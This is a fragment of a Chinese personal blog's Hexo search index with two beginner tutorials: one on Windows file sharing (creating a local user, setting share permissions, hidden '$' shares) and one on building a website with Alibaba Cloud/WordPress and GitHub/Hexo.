        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件共享</title>
      <link href="/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/"/>
      <url>/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h1><p>本人学了一点文件共享的知识在这里分享一下</p><h2 id="具体操作过程"><a href="#具体操作过程" class="headerlink" title="具体操作过程"></a>具体操作过程</h2><p>创建用户a密码为a<br>命令行：net user a a /add<br>1.创建文件夹，并在文件的属性中找到共享栏，点击高级共享在这里设置你共享的文件夹名字在高级共享中有权限设置，在这里进行相关权限的设置。<br>2.在所共享的文件夹中的安全栏中的高级处点击禁用继承，这时会弹出一个对话框提示你是否对原本的权限进行保留（根据自身需要进行选择），之后回到安全界面选择添加然后选择主体，在输入要选择的对象名称处添加你所想要授权访问的同户名，然后再给你所设置的用户设置权限。（这里你所设置的用户名必须先前在你自己的电脑上已经有的用户名）如果你想在说共享的文件夹中的子文件夹进行权限设置，步骤同上边2相同。<br>3.访问你所共享的文件夹（这里我举的例子是在同一座交换机上，也可以在虚拟机上操作）win+r打开运行窗口输入： //你要访问的共享文件夹所在的主机IP地址，然后的操作有手就行，这里不做过多阐述，另一种方法是访问文件夹也可以在运行窗口输入： //你要访问的共享文件夹所在的主机IP地址/共享文件夹名字 ，之后就可以共享了。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>如果你想在文件共享中将一些文件隐藏起来，可以在设置文件的共享名时，在文件的共享名后边加一个$符，这样别人在访问这个文件夹时就必须在地址栏上输入： //你的IP地址/共享文件夹名/隐藏的文件夹名$<br>例如我的IP地址为10.1.1.1，我所共享的文件夹名为share我所隐藏的文件夹名为dollar，则我需要在地址栏上输入：//10.1.1.1/share/dollar$</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站建造</title>
      <link href="/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/"/>
      <url>/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="自建网站过程"><a href="#自建网站过程" class="headerlink" title="自建网站过程"></a>自建网站过程</h1><p>本人白嫖阿里云的服务器没嫖到，就自己买了个服务器，结果一大堆麻烦事，整个域名验证还老不通过，索性就直接用id了。</p><h2 id="一：利用阿里云服务器建网站"><a href="#一：利用阿里云服务器建网站" class="headerlink" title="一：利用阿里云服务器建网站"></a>一：利用阿里云服务器建网站</h2><p>首先你的先有个服务器，本人用的是ubantu的版本，注意这里你在配置服务器的时候需要选择相关网站的镜像，（本人用的是wordpress的镜像）否则的话，就要重新安装服务器系统了。在配置完服务器之后，你可以直接在网页地址栏中输入你的服务器的IP地址就可以直接访问你所设置的网页初始页面。</p><p>我的网站因为设置的是wordpress的类型的博客所以在初始页面中会让我设置登录名，密码，邮箱等。等弄好之后就可以访问你的博客网站了。</p><p>如果还是不太明白可以看这位的建网站过程：<a href="https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ" target="_blank" rel="noopener">https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ</a></p><h2 id="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"><a href="#二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）" class="headerlink" title="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"></a>二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）</h2><p>这个方法过程有点复杂，本人也不太明白这其中的原理，具体建造过程可以根据这位的教程：<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">https://yafine-blog.cn/posts/4ab2.html</a></p><p>在这里本人也提醒一下，在建造网站的过程中，一定要看好是在哪个文件夹的根目录文件进行相关修改（本人应为这个原因重做了好几次），同时也要及时进行文件的同步，要不然你的网站就没啥变化，最后，提醒一下如果你的网页出现找不到相关页面的话，可以在GitHub上看下你是否有这个文件，如果没有的话就要重新同步一下，如果同步完之后还是没有的话就在你的网站所在文件夹的public文件夹中看下是否有相关文件夹，没有的话就粗暴点自己手动建个然后再同步，基本上就解决了（<del>本人在建网站时因为这个问题都快疯了</del>）。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站的建造 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
